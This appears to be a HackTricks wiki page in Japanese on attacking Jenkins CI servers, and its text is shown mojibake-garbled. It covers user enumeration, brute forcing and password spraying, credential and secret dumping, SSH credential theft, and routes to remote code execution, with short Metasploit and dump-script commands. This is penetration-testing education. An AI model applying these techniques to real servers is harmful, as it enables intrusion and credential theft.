# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

Jenkinsã¯ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã»ã¼**ã™ã¹ã¦ã®**ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã¨ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãƒªãƒã‚¸ãƒˆãƒªã®**ç¶™ç¶šçš„ã‚¤ãƒ³ãƒ†ã‚°ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã¾ãŸã¯**ç¶™ç¶šçš„ãƒ‡ãƒªãƒãƒªãƒ¼**ï¼ˆCI/CDï¼‰ç’°å¢ƒã‚’ç¢ºç«‹ã™ã‚‹ãŸã‚ã®ç°¡å˜ãªæ–¹æ³•ã‚’æä¾›ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ã•ã‚‰ã«ã€ã•ã¾ã–ã¾ãªãƒ«ãƒ¼ãƒãƒ³é–‹ç™ºã‚¿ã‚¹ã‚¯ã‚’è‡ªå‹•åŒ–ã—ã¾ã™ã€‚Jenkinsã¯**å€‹ã€…ã®ã‚¹ãƒ†ãƒƒãƒ—ã®ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆã™ã‚‹å¿…è¦æ€§ã‚’æ’é™¤ã™ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒ**ã€æ‰‹å‹•ã§ç°¡å˜ã«æ§‹ç¯‰ã§ãã‚‹ã‚ˆã‚Šã‚‚ã€ãƒ“ãƒ«ãƒ‰ã€ãƒ†ã‚¹ãƒˆã€ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãƒ„ãƒ¼ãƒ«ã®å…¨ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’çµ±åˆã™ã‚‹ãŸã‚ã®ã‚ˆã‚Šè¿…é€Ÿã§å …ç‰¢ãªæ–¹æ³•ã‚’æä¾›ã—ã¾ã™ã€‚

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## èªè¨¼ã•ã‚Œã¦ã„ãªã„åˆ—æŒ™

èªè¨¼ãªã—ã§èˆˆå‘³æ·±ã„Jenkinsãƒšãƒ¼ã‚¸ã‚’æ¤œç´¢ã™ã‚‹ã«ã¯ï¼ˆ_ /people_ã‚„_ /asynchPeople_ã®ã‚ˆã†ã«ã€ã“ã‚Œã«ã‚ˆã‚Šç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒªã‚¹ãƒˆã•ã‚Œã¾ã™ï¼‰ã€æ¬¡ã®ã‚ˆã†ã«ã§ãã¾ã™ï¼š
```
msf> use auxiliary/scanner/http/jenkins_enum
```
èªè¨¼ãªã—ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‹ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```
msf> use auxiliary/scanner/http/jenkins_command
```
èªè¨¼æƒ…å ±ãŒãªã„å ´åˆã€_**/asynchPeople/**_ ãƒ‘ã‚¹ã‚„ _**/securityRealm/user/admin/search/index?q=**_ ã§ **ãƒ¦ãƒ¼ã‚¶ãƒ¼å** ã‚’ç¢ºèªã§ãã¾ã™ã€‚

_**/oops**_ ã¾ãŸã¯ _**/error**_ ãƒ‘ã‚¹ã‹ã‚‰ Jenkins ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å–å¾—ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

![](<../../.gitbook/assets/image (146).png>)

### æ—¢çŸ¥ã®è„†å¼±æ€§

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ãƒ­ã‚°ã‚¤ãƒ³

åŸºæœ¬æƒ…å ±ã§ã¯ã€**Jenkins å†…ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ãŸã‚ã®ã™ã¹ã¦ã®æ–¹æ³•**ã‚’ç¢ºèªã§ãã¾ã™ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ç™»éŒ²

ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ Jenkins ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¨ã¦ã‚‚ç°¡å˜ã§ã™ã€‚

### **SSO ãƒ­ã‚°ã‚¤ãƒ³**

ã¾ãŸã€**SSO** **æ©Ÿèƒ½**/**ãƒ—ãƒ©ã‚°ã‚¤ãƒ³** ãŒå­˜åœ¨ã™ã‚‹å ´åˆã¯ã€ãƒ†ã‚¹ãƒˆã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆä¾‹ï¼šãƒ†ã‚¹ãƒˆ **Github/Bitbucket ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**ãƒ­ã‚°ã‚¤ãƒ³**ã‚’è©¦ã¿ã‚‹ã¹ãã§ã™ã€‚[**ã“ã¡ã‚‰**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)ã®ãƒˆãƒªãƒƒã‚¯ã‚’å‚è€ƒã«ã—ã¦ãã ã•ã„ã€‚

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

**Jenkins** ã¯ **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼** ã¨ **ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ç·©å’Œ** ãŒæ¬ ã‘ã¦ã„ã¾ã™ã€‚**å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰** ã‚„ **ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨**ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚ã•ã‚‰ã«ã€**é€†ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ã—ã¦ä½¿ç”¨**ã—ã¦ã„ã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚
```
msf> use auxiliary/scanner/http/jenkins_login
```
### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚¹ãƒ—ãƒ¬ãƒ¼

[ã“ã®Pythonã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)ã¾ãŸã¯[ã“ã®PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/chryzsh/JenkinsPasswordSpray)ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚

### IPãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆãƒã‚¤ãƒ‘ã‚¹

å¤šãã®çµ„ç¹”ã¯ã€GitHubã‚„GitLabã®ã‚ˆã†ãª**SaaSãƒ™ãƒ¼ã‚¹ã®ã‚½ãƒ¼ã‚¹ç®¡ç†ï¼ˆSCMï¼‰ã‚·ã‚¹ãƒ†ãƒ **ã‚’ã€Jenkinsã‚„TeamCityã®ã‚ˆã†ãª**å†…éƒ¨ã®è‡ªå·±ãƒ›ã‚¹ãƒˆå‹CI**ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã¨çµ„ã¿åˆã‚ã›ã¦ã„ã¾ã™ã€‚ã“ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã«ã‚ˆã‚Šã€CIã‚·ã‚¹ãƒ†ãƒ ã¯**SaaSã‚½ãƒ¼ã‚¹ç®¡ç†ãƒ™ãƒ³ãƒ€ãƒ¼ã‹ã‚‰ã®ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ã‚¤ãƒ™ãƒ³ãƒˆ**ã‚’å—ä¿¡ã—ã€ä¸»ã«ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚¸ãƒ§ãƒ–ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã‚’å®Ÿç¾ã™ã‚‹ãŸã‚ã«ã€çµ„ç¹”ã¯**SCMãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®IPç¯„å›²ã‚’ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆ**ã«ç™»éŒ²ã—ã€**ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯**ã‚’ä»‹ã—ã¦**å†…éƒ¨CIã‚·ã‚¹ãƒ†ãƒ **ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€**èª°ã§ã‚‚**GitHubã‚„GitLabã«**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã‚’ä½œæˆã—ã€**ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ã‚’ãƒˆãƒªã‚¬ãƒ¼**ã™ã‚‹ã‚ˆã†ã«è¨­å®šã§ãã‚‹ãŸã‚ã€**å†…éƒ¨CIã‚·ã‚¹ãƒ†ãƒ **ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ç¢ºèªã—ã¦ãã ã•ã„: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/)

## å†…éƒ¨Jenkinsã®æ‚ªç”¨

ã“ã‚Œã‚‰ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®æœ‰åŠ¹ãªã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹ã¨ä»®å®šã—ã¾ã™ã€‚

{% hint style="warning" %}
Jenkinsã«è¨­å®šã•ã‚ŒãŸ**èªè¨¼**ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¨ä¾µå®³ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã«ã‚ˆã£ã¦ã¯ã€ä»¥ä¸‹ã®æ”»æ’ƒã‚’**å®Ÿè¡Œã§ãã‚‹å ´åˆã¨ã§ããªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚**
{% endhint %}

è©³ç´°ã«ã¤ã„ã¦ã¯ã€åŸºæœ¬æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªã‚¹ãƒˆè¡¨ç¤º

Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸå ´åˆã€[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)ã§ä»–ã®ç™»éŒ²ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒªã‚¹ãƒˆè¡¨ç¤ºã§ãã¾ã™ã€‚

### ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®ç§˜å¯†ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã®ãƒ“ãƒ«ãƒ‰ãƒ€ãƒ³ãƒ—

[ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ“ãƒ«ãƒ‰ã‚³ãƒ³ã‚½ãƒ¼ãƒ«å‡ºåŠ›ã¨ãƒ“ãƒ«ãƒ‰ç’°å¢ƒå¤‰æ•°ã‚’ãƒ€ãƒ³ãƒ—ã—ã€ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®ç§˜å¯†ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚’æœŸå¾…ã—ã¦ãã ã•ã„ã€‚
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSHè³‡æ ¼æƒ…å ±ã®ç›—é›£**

ã‚‚ã—ä¾µå®³ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**æ–°ã—ã„Jenkinsãƒãƒ¼ãƒ‰ã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹ã®ã«ååˆ†ãªæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹**å ´åˆã€SSHè³‡æ ¼æƒ…å ±ãŒä»–ã®ãƒãƒ¼ãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã™ã§ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã¨ã€å½¼ã¯**ãƒãƒ¼ãƒ‰ã‚’ä½œæˆ/å¤‰æ›´ã—ã€è³‡æ ¼æƒ…å ±ã‚’è¨˜éŒ²ã™ã‚‹ãƒ›ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ãã‚Œã‚‰ã®è³‡æ ¼æƒ…å ±ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ›ã‚¹ãƒˆã‚­ãƒ¼ã‚’æ¤œè¨¼ã›ãšã«:

![](<../../.gitbook/assets/image (218).png>)

é€šå¸¸ã€Jenkinsã®SSHè³‡æ ¼æƒ…å ±ã¯**ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**ï¼ˆ`/credentials/`ï¼‰ã«è¦‹ã¤ã‹ã‚‹ã®ã§ã€ä»–ã®ç§˜å¯†ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã®ã¨åŒæ§˜ã«ãã‚Œã‚‰ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã¯[**ç§˜å¯†ã®ãƒ€ãƒ³ãƒ—ã‚»ã‚¯ã‚·ãƒ§ãƒ³**](./#dumping-secrets)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### **Jenkinsã«ãŠã‘ã‚‹RCE**

**Jenkinsã‚µãƒ¼ãƒãƒ¼ã§ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹**ã“ã¨ã¯ã€æ”»æ’ƒè€…ã«ã™ã¹ã¦ã®**ç§˜å¯†**ã‚„**ç’°å¢ƒå¤‰æ•°**ã‚’æ¼æ´©ã•ã›ã€åŒã˜ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã‚ã‚‹ä»–ã®ãƒã‚·ãƒ³ã‚’**æ‚ªç”¨ã™ã‚‹**æ©Ÿä¼šã‚’ä¸ãˆã€ã•ã‚‰ã«ã¯**ã‚¯ãƒ©ã‚¦ãƒ‰è³‡æ ¼æƒ…å ±ã‚’åé›†ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Jenkinsã¯**SYSTEMã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€ãã‚Œã‚’ä¾µå®³ã™ã‚‹ã“ã¨ã§æ”»æ’ƒè€…ã¯**SYSTEMæ¨©é™**ã‚’å¾—ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚

### **ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä½œæˆ/å¤‰æ›´ã«ã‚ˆã‚‹RCE**

ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã€Jenkinsã‚µãƒ¼ãƒãƒ¼ä¸Šã§RCEã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã§ã™:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã«ã‚ˆã‚‹RCE**

Groovyã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚ã§ãã€ã“ã‚Œã¯æ–°ã—ã„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ã‚ˆã‚Šã‚‚ç›®ç«‹ãŸãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ä½œæˆ/å¤‰æ›´ã«ã‚ˆã‚‹RCE

**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦RCEã‚’å–å¾—ã™ã‚‹**ã“ã¨ã‚‚ã§ãã¾ã™:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®æ‚ªç”¨

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€Jenkinsã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã€‚

### ãƒ“ãƒ«ãƒ‰ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³

**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³**ã¯**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ“ãƒ«ãƒ‰ãƒ¡ã‚«ãƒ‹ã‚ºãƒ **ã¨ã—ã¦ã‚‚ä½¿ç”¨ã§ãã€ãã®å ´åˆã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³æ§‹æ–‡ã‚’å«ã‚€**ãƒªãƒã‚¸ãƒˆãƒªå†…ã®ãƒ•ã‚¡ã‚¤ãƒ«**ã‚’è¨­å®šã§ãã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`/Jenkinsfile`ãŒä½¿ç”¨ã•ã‚Œã¾ã™:

![](<../../.gitbook/assets/image (127).png>)

ä»–ã®å ´æ‰€ï¼ˆä¾‹ãˆã°ä»–ã®ãƒªãƒã‚¸ãƒˆãƒªï¼‰ã«ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ä¿å­˜ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½**ã§ã€ãƒªãƒã‚¸ãƒˆãƒªã‚¢ã‚¯ã‚»ã‚¹ã¨ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚¢ã‚¯ã‚»ã‚¹ã‚’**åˆ†é›¢ã™ã‚‹**ã“ã¨ã‚’ç›®çš„ã¨ã—ã¦ã„ã¾ã™ã€‚

æ”»æ’ƒè€…ãŒ**ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã«å¯¾ã—ã¦æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã£ã¦ã„ã‚‹å ´åˆ**ã€å½¼ã¯ãã‚Œã‚’**å¤‰æ›´**ã—ã€Jenkinsã«ã‚¢ã‚¯ã‚»ã‚¹ã›ãšã«**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹**ã“ã¨ãŒã§ãã‚‹ã§ã—ã‚‡ã†ã€‚\
æ”»æ’ƒè€…ã¯**ã„ãã¤ã‹ã®ãƒ–ãƒ©ãƒ³ãƒä¿è­·ã‚’å›é¿ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“**ï¼ˆãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™ã«ã‚ˆã£ã¦ã¯å›é¿ã§ãã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ï¼‰ã€‚

ã‚«ã‚¹ã‚¿ãƒ ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®æœ€ã‚‚ä¸€èˆ¬çš„ãªãƒˆãƒªã‚¬ãƒ¼ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:

* **ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã¸ã®ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ï¼ˆã¾ãŸã¯ä»–ã®ãƒ–ãƒ©ãƒ³ãƒã¸ã®ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆï¼‰
* **ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã¸ã®ãƒ—ãƒƒã‚·ãƒ¥**ï¼ˆã¾ãŸã¯ä»–ã®ãƒ–ãƒ©ãƒ³ãƒã¸ã®ãƒ—ãƒƒã‚·ãƒ¥ï¼‰
* **ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã®æ›´æ–°**ã‚’è¡Œã„ã€ä½•ã‚‰ã‹ã®æ–¹æ³•ã§å®Ÿè¡Œã•ã‚Œã‚‹ã®ã‚’å¾…ã¤

{% hint style="info" %}
ã‚‚ã—ã‚ãªãŸãŒ**å¤–éƒ¨ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã§ã‚ã‚Œã°ã€**ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼/çµ„ç¹”ã®ãƒªãƒã‚¸ãƒˆãƒªã®ãƒ¡ã‚¤ãƒ³ãƒ–ãƒ©ãƒ³ãƒã«PRã‚’ä½œæˆã—ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹**ã“ã¨ã‚’æœŸå¾…ã™ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“...ã—ã‹ã—ã€**ä¸é©åˆ‡ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹**å ´åˆã€ã‚ãªãŸã¯ã“ã®æ–¹æ³•ã§ä¼æ¥­ã‚’å®Œå…¨ã«**ä¾µå®³ã™ã‚‹**ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
{% endhint %}

### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³RCE

å‰ã®RCEã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€[**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§RCEã‚’å–å¾—ã™ã‚‹æŠ€è¡“**](./#rce-creating-modifying-pipeline)ãŒã™ã§ã«ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚

### ç’°å¢ƒå¤‰æ•°ã®ç¢ºèª

**å¹³æ–‡ã®ç’°å¢ƒå¤‰æ•°**ã‚’ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³å…¨ä½“ã¾ãŸã¯ç‰¹å®šã®ã‚¹ãƒ†ãƒ¼ã‚¸ã®ãŸã‚ã«å®£è¨€ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã‚‰ã®ç’°å¢ƒå¤‰æ•°ã¯**æ©Ÿå¯†æƒ…å ±ã‚’å«ã‚€ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“**ãŒã€æ”»æ’ƒè€…ã¯å¸¸ã«**ã™ã¹ã¦ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³**è¨­å®š/Jenkinsfileã‚’**ç¢ºèªã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### ç§˜å¯†ã®ãƒ€ãƒ³ãƒ—

JenkinsãŒç§˜å¯†ã‚’é€šå¸¸ã©ã®ã‚ˆã†ã«æ‰±ã†ã‹ã«ã¤ã„ã¦ã®æƒ…å ±ã¯ã€åŸºæœ¬æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

è³‡æ ¼æƒ…å ±ã¯**ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**ï¼ˆ`/credentials/`ï¼‰ã¾ãŸã¯**ç‰¹å®šã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆ**ï¼ˆ`/job/<project-name>/configure`ï¼‰ã«**ã‚¹ã‚³ãƒ¼ãƒ—**ã‚’è¨­å®šã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã™ã¹ã¦ã®ç§˜å¯†ã‚’æŠ½å‡ºã™ã‚‹ã«ã¯ã€**ç§˜å¯†ã‚’å«ã‚€ã™ã¹ã¦ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’å°‘ãªãã¨ã‚‚ä¾µå®³ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã€ã‚«ã‚¹ã‚¿ãƒ /æ¯’å…¥ã‚Šãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

